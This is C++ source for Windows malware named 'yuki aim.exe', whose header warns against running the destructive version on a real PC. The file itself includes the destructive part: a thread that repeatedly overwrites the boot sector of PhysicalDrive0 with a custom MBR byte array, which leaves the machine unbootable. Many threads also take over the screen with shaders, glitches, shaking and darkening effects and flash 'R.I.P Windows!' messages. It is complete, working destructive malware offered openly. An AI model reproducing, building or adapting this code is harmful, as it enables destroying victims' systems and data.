// yuki aim.exe by VietNamLover (name by Clutterxomdz).
// Don't run the destructive version on your real PC, if you want to run this malware on your real PC, run the safety version.

#include <Windows.h>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <algorithm>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")

using namespace std;

const unsigned char MasterBootRecord[] = {0xB4, 0x02, 0xB0, 0x02, 0xB5, 0x00, 0xB1, 0x02, 0xB6, 0x00, 0xBB, 0x00, 0x7E, 0xCD, 0x13, 0xE9, 
0xEE, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA, 
0xBD, 0x80, 0xFC, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xCD, 0x1A, 0x89, 0x56, 0x08, 0xB8, 0x00, 0xA0, 
0x8E, 0xD8, 0x8E, 0xC0, 0xB0, 0x6B, 0x89, 0xE9, 0x31, 0xFF, 0xF3, 0xAA, 0x30, 0xC0, 0xBF, 0x80, 
0x2D, 0xBA, 0x80, 0x00, 0xB1, 0x40, 0xF3, 0xAA, 0x81, 0xC7, 0x00, 0x01, 0x4A, 0x75, 0xF5, 0x88, 
0x46, 0x0A, 0xBB, 0x72, 0x7F, 0xE8, 0x27, 0x02, 0xE8, 0x3E, 0x02, 0x88, 0x46, 0x02, 0xE8, 0x38, 
0x02, 0x88, 0x46, 0x03, 0xBF, 0x98, 0x2D, 0xBB, 0x08, 0x00, 0x89, 0x5E, 0x04, 0xE8, 0xA9, 0x00, 
0x75, 0xAE, 0x8B, 0x7E, 0x00, 0xB4, 0x01, 0xCD, 0x16, 0x74, 0x08, 0xB4, 0x00, 0xCD, 0x16, 0x88, 
0xE3, 0xEB, 0xF2, 0x88, 0xD8, 0x3C, 0x4B, 0x75, 0x06, 0x83, 0xEF, 0x08, 0xE8, 0x85, 0x00, 0x3C, 
0x4D, 0x75, 0x06, 0x83, 0xC7, 0x08, 0xE8, 0x7B, 0x00, 0x3C, 0x50, 0x74, 0x35, 0x30, 0xC9, 0x3C, 
0x1E, 0x74, 0x06, 0xB1, 0x08, 0x3C, 0x1F, 0x75, 0x1A, 0xE8, 0x7E, 0x00, 0xBB, 0x08, 0xF6, 0x33, 
0x5E, 0x04, 0xF6, 0x41, 0x05, 0xFF, 0x75, 0x08, 0x89, 0x5E, 0x04, 0x30, 0xD9, 0xD3, 0x4E, 0x02, 
0xE8, 0x77, 0x00, 0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x56, 0x06, 0x72, 0xA6, 0x83, 0xC2, 0x04, 0x89, 
0x56, 0x06, 0x81, 0xC7, 0x00, 0x0A, 0xE8, 0x3B, 0x00, 0x74, 0x97, 0xBB, 0x88, 0x7F, 0xE8, 0x9E, 
0x01, 0xD0, 0x6E, 0x0B, 0x73, 0x1B, 0xE8, 0x23, 0x00, 0xBB, 0xFF, 0x7F, 0xE8, 0x90, 0x01, 0xBB, 
0x0B, 0x80, 0xE8, 0x8A, 0x01, 0xD0, 0x6E, 0x0B, 0x73, 0x05, 0xE8, 0x0F, 0x00, 0xEB, 0xF0, 0xEB, 
0xDA, 0x80, 0x7E, 0x0A, 0x00, 0x0F, 0x87, 0x4F, 0xFF, 0xF4, 0xEB, 0xFD, 0xB9, 0x03, 0x00, 0xB4, 
0x86, 0xCD, 0x15, 0xC3, 0x57, 0xE8, 0x12, 0x00, 0x5F, 0x8A, 0x45, 0x05, 0x0A, 0x41, 0x05, 0x75, 
0x03, 0x89, 0x7E, 0x00, 0x9C, 0xE8, 0x12, 0x00, 0x9D, 0xC3, 0x31, 0xC0, 0xE8, 0x0E, 0x00, 0xC6, 
0x45, 0x07, 0x00, 0x29, 0xDF, 0xC6, 0x45, 0x07, 0x00, 0xC3, 0x8B, 0x46, 0x02, 0x8B, 0x7E, 0x00, 
0x8B, 0x5E, 0x04, 0xBE, 0x92, 0x80, 0xBA, 0xFF, 0xFD, 0x85, 0xDB, 0x78, 0x06, 0xBE, 0x9C, 0x80, 
0xBA, 0xFB, 0xFC, 0xE8, 0x0E, 0x00, 0x88, 0x55, 0x07, 0x88, 0xE0, 0x01, 0xDF, 0xE8, 0x04, 0x00, 
0x88, 0x75, 0x07, 0xC3, 0x60, 0xC6, 0x45, 0x07, 0x00, 0x88, 0xC4, 0xBA, 0x07, 0x00, 0x2E, 0xAC, 
0x88, 0xC3, 0xB9, 0x07, 0x00, 0x30, 0xC0, 0xD0, 0xC3, 0x73, 0x02, 0x88, 0xE0, 0xAA, 0xE2, 0xF5, 
0x81, 0xC7, 0x39, 0x01, 0xD0, 0xE3, 0x4A, 0x72, 0xE9, 0x75, 0xE3, 0x89, 0xE5, 0x89, 0x76, 0x02, 
0x61, 0xC3, 0xE8, 0x04, 0x01, 0x80, 0xFC, 0xDC, 0x72, 0xF7, 0x80, 0x7E, 0x0A, 0x08, 0x74, 0xF1, 
0xFE, 0x46, 0x0A, 0xBE, 0xB2, 0x80, 0xEB, 0xBC, 0xBB, 0x08, 0x00, 0xE8, 0x03, 0x00, 0xBB, 0x00, 
0x0A, 0x57, 0x8A, 0x45, 0x05, 0x84, 0xC0, 0x74, 0x3E, 0xB9, 0x03, 0x00, 0x01, 0xDF, 0x3A, 0x45, 
0x05, 0x75, 0x34, 0xE2, 0xF7, 0xB9, 0x04, 0x00, 0x80, 0xBD, 0xC3, 0x03, 0x00, 0x75, 0x03, 0xFE, 
0x4E, 0x0A, 0x8A, 0x55, 0x07, 0xBE, 0xAD, 0x80, 0xE8, 0x89, 0xFF, 0xE8, 0x1B, 0x00, 0x75, 0x0F, 
0xBE, 0xA7, 0x80, 0x01, 0xD7, 0x50, 0x8A, 0x45, 0x05, 0xE8, 0x78, 0xFF, 0x58, 0x29, 0xD7, 0x29, 
0xDF, 0xE2, 0xDF, 0xC6, 0x46, 0x0B, 0x01, 0x5F, 0xC3, 0x80, 0xFA, 0xFF, 0x75, 0x04, 0xBA, 0x00, 
0xF6, 0xC3, 0x80, 0xFA, 0xFD, 0x75, 0x04, 0xBA, 0x00, 0x0A, 0xC3, 0x80, 0xFA, 0xFC, 0x75, 0x04, 
0xBA, 0xF8, 0xFF, 0xC3, 0x80, 0xFA, 0xFB, 0xBA, 0x08, 0x00, 0x75, 0x02, 0xB2, 0x00, 0xC3, 0xF6, 
0x85, 0x83, 0x02, 0xFF, 0x75, 0xD2, 0x30, 0xC0, 0xE9, 0x39, 0xFF, 0x80, 0xBD, 0xC3, 0x03, 0x00, 
0x74, 0xC6, 0x80, 0xBD, 0x05, 0x0A, 0x00, 0x75, 0xBF, 0x8A, 0x45, 0x07, 0x89, 0xFE, 0x81, 0xC7, 
0x00, 0x0A, 0x3C, 0xFC, 0x74, 0x04, 0x3C, 0xFB, 0x75, 0x18, 0x88, 0xC2, 0xE8, 0xAA, 0xFF, 0x89, 
0xD3, 0x80, 0x79, 0x05, 0x00, 0x75, 0xA1, 0x01, 0xD6, 0x01, 0xD7, 0xE8, 0x08, 0x00, 0x29, 0xD7, 
0x29, 0xD6, 0xC6, 0x46, 0x0B, 0x01, 0xBB, 0x08, 0x00, 0xB9, 0x08, 0x00, 0xA4, 0xC6, 0x44, 0xFF, 
0x00, 0xE2, 0xF9, 0x81, 0xC7, 0x38, 0x01, 0x81, 0xC6, 0x38, 0x01, 0x4B, 0x75, 0xEB, 0xC3, 0xBF, 
0xB8, 0xC3, 0xB9, 0x08, 0x00, 0x60, 0xFF, 0xD3, 0x61, 0x83, 0xEF, 0x08, 0xE2, 0xF7, 0x81, 0xEF, 
0xC0, 0x09, 0x81, 0xFF, 0x80, 0x2D, 0x77, 0xEA, 0xC3, 0x8B, 0x46, 0x08, 0x89, 0xC3, 0x30, 0xFB, 
0xC1, 0xE8, 0x07, 0x88, 0xDC, 0x89, 0x46, 0x08, 0x24, 0x03, 0x74, 0xED, 0xBB, 0xB8, 0x80, 0x2E, 
0xD7, 0xC3, 0xBF, 0xBF, 0xBE, 0xFE, 0x7C, 0x7C, 0xDE, 0xBF, 0xBF, 0xFE, 0x7E, 0xC2, 0xBE, 0xFF, 
0xFE, 0x7E, 0xFC, 0x06, 0xFF, 0xFF, 0xFC, 0x7C, 0xDE, 0xBF, 0xBE, 0xFE, 0x7C, 0x7C, 0x83, 0x83, 
0x82, 0x7C, 0xC6, 0x38, 0x10, 0xAA, 0xFE, 0x92, 0x7C, 0x2C, 0x27, 0x36
};
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

struct VERTEX {
    float x, y, z;
};

struct EDGE {
    int vtx0, vtx1;
};

// ==================== MBR WIPER ====================
DWORD WINAPI MBRWiper(LPVOID lpParam) {
    while (1) {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);
        WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
        CloseHandle(hDevice);
    }
}
namespace _3D {
    void RotateX(VERTEX* v, float angle) {
        float tempY = v->y * cos(angle) - v->z * sin(angle);
        float tempZ = v->y * sin(angle) + v->z * cos(angle);
        v->y = tempY;
        v->z = tempZ;
    }

    void RotateY(VERTEX* v, float angle) {
        float tempX = v->x * cos(angle) + v->z * sin(angle);
        float tempZ = -v->x * sin(angle) + v->z * cos(angle);
        v->x = tempX;
        v->z = tempZ;
    }

    void RotateZ(VERTEX* v, float angle) {
        float tempX = v->x * cos(angle) - v->y * sin(angle);
        float tempY = v->x * sin(angle) + v->y * cos(angle);
        v->x = tempX;
        v->y = tempY;
    }

    void DrawEdge(HDC hdc, int x1, int y1, int x2, int y2, int size) {
        HPEN pen = CreatePen(PS_SOLID, 1, RGB(rand() % 255, rand() % 255, rand() % 255));
        HPEN oldPen = (HPEN)SelectObject(hdc, pen);
        MoveToEx(hdc, x1, y1, NULL);
        LineTo(hdc, x2, y2);
        SelectObject(hdc, oldPen);
        DeleteObject(pen);
    }
}

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE Reserved;
    };
} _RGBQUAD, * PRGBQUAD;

typedef struct
{
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;

namespace Colors
{
    HSL rgb2hsl(RGBQUAD rgb)
    {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f)
        {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl)
    {
        RGBQUAD rgb = {0};

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f)
        {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant)
            {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}

int red = 0, green = 0, blue = 0;
bool ifcolorblue = false, ifblue = false;

COLORREF Hue(int length) {
    if (red != length) {
        red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else if (green != length) {
        green++;
        return RGB(length, green, 0);
    }
    else if (blue != length) {
        blue++;
        return RGB(0, length, blue);
    }
    else {
        red = 0; green = 0; blue = 0;
        ifblue = true;
        return RGB(0, 0, 0);
    }
}

DWORD WINAPI shader1(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;
        double angle = 0.0f;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                FLOAT fx = ((double)(tan(x / 500.f - y / h * 0.1) + i / 5))*5;
                FLOAT fx2 = ((double)(tan(y / 500.f - x / w * 0.1) + i / 5))*5;
                FLOAT fx3 = ((double)(tan(x / 500.f - y / h * 0.1) + i / 5))*5;
                FLOAT fx4 = (fx + fx2 + fx3) * (fx + fx2 + fx3) * 5;

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx4 / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); 
        DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI shader2(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;
        double angle = 0.0f;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int cx = abs(x - (w / 2));
                int cy = abs(y - (h / 2));
                int zx = cos(angle) * cx - sin(angle) * cy;
                int zy = sin(angle) * cx + cos(angle) * cy;
                int fx = (zx + i) ^ (zy + i);

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); 
        DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI Tesseract(LPVOID lpvd)
{
    HDC dc = GetDC(NULL);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    float size = (float)(w + h) / 10;

    float cx = size;
    float cy = size;

    int xdv = 10;
    int ydv = 10;

    float angleX = 0.01;
    float angleY = 0.01;
    float angleZ = 0.01;

    float d = 60.0f;

    VERTEX vtx[] =
    {
        {size, 0, 0},
        {size, size, 0},
        {0, size, 0},
        {0, 0, 0},
        {size, 0, size},
        {size, size, size},
        {0, size, size},
        {0, 0, size},
        {size - d,  d,      d},
        {size - d,  size - d,  d},
        {d,      size - d,  d},
        {d,      d,      d},
        {size - d,  d,      size - d},
        {size - d,  size - d,  size - d},
        {d,      size - d,  size - d},
        {d,      d,      size - d}
    };

    EDGE edges[] =
    {
        {0, 1},
        {1, 2},
        {2, 3},
        {3, 0},
        {0, 4},
        {1, 5},
        {2, 6},
        {3, 7},
        {4, 5},
        {5, 6},
        {6, 7},
        {7, 4},
        {8,   9},
        {9,  10},
        {10, 11},
        {11,  8},
        {8,  12},
        {9,  13},
        {10, 14},
        {11, 15},
        {12, 13},
        {13, 14},
        {14, 15},
        {15, 12},
        {0,  8},
        {1,  9},
        {2, 10},
        {3, 11},
        {4, 12},
        {5, 13},
        {6, 14},
        {7, 15}
    };

    int index = rand() % 4;
    int totvtx = sizeof(vtx) / sizeof(vtx[0]);
    int totedg = sizeof(edges) / sizeof(edges[0]);

    while (true)
    {
        dc = GetDC(NULL);

        for (int i = 0; i < totvtx; i++)
        {
            _3D::RotateX(&vtx[i], angleX);
            _3D::RotateY(&vtx[i], angleY);
            _3D::RotateZ(&vtx[i], angleZ);
        }

        for (int i = 0; i < totedg; i++)
        {
            _3D::DrawEdge(dc,
                (int)(vtx[edges[i].vtx0].x + cx), (int)(vtx[edges[i].vtx0].y + cy),
                (int)(vtx[edges[i].vtx1].x + cx), (int)(vtx[edges[i].vtx1].y + cy), 20);
        }

        Sleep(40);

        cx += xdv;
        cy += ydv;

        if (cx > w - (size / 2) || cx < -(size / 2))
        {
            xdv *= -1;
            index = rand() % 4;
        }

        if (cy > h - (size / 2) || cy < -(size / 2))
        {
            ydv *= -1;
            index = rand() % 4;
        }
        ReleaseDC(0, dc);
    }

    return 0x00;
}

DWORD WINAPI blur1(LPVOID lpParam) {
    HDC hdc;
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        hdc = GetDC(0); 
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, screenshot);
        BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 30; i++) {
            StretchBlt(hdcMem, rand() % 10, rand() % 10, sw - 20, sh - 20, hdcMem, 0, 0, sw, sh, SRCCOPY);
        }
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
        AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
        ReleaseDC(0, hdc);
        DeleteObject(screenshot); 
        DeleteDC(hdcMem); 
        DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader3(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;

    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, 0, 0);
    SelectObject(hdcMem, hbmTemp);
    
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;

            int cx = x - (w / 2);
            int cy = y - (h / 2);

            int zx = (cx * cx);
            int zy = (cy * cy);

            int di = 128 + i;

            int fx = di + (di * (int)(sin(sqrt((float)(zx + zy)) / 32.0)));
            rgbScreen[i].r += 15;
            rgbScreen[i].g = fx;
            rgbScreen[i].b += 45;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); 
        DeleteDC(hdcScreen);
    }
}

DWORD WINAPI glitc(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 666, rand() % 666, w, h, hdc, rand() % 666, rand() % 666, NOTSRCCOPY);
        Sleep(100);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI sq(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    while (1) {
        HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
        int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y;
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        Rectangle(hdc, top_x, top_y, bottom_x, bottom_y);
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
            signY = -1;
        }

        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }

        if (y == 0)
        {
            signY = 1;
        }

        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shake(LPVOID lpvd)
{
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCCOPY);
        Sleep(1);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI darker(LPVOID lpvd)
{
    HDC hdc;
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (1) {
        hdc = GetDC(0);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
        Sleep(100);
        ReleaseDC(0, hdc);
        if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
    }
}

DWORD WINAPI textz1(LPVOID lpvd)
{
    int x = GetSystemMetrics(0); 
    int y = GetSystemMetrics(1);
    LPCSTR text = 0;
    LPCSTR text1 = 0;
    LPCSTR text2 = 0;
    LPCSTR text3 = 0;
    LPCSTR text4 = 0;

    while (1)
    {
        HDC hdc = GetDC(0);
        text = "yuki aim.exe";
        text1 = "VietNamLover";
        text2 = "name by yuki aim (Clutterxmodz)";
        text3 = "R.I.P Windows!";
        text4 = "You need to reinstall Windows soon!";
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
        TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
        TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
        TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
        TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

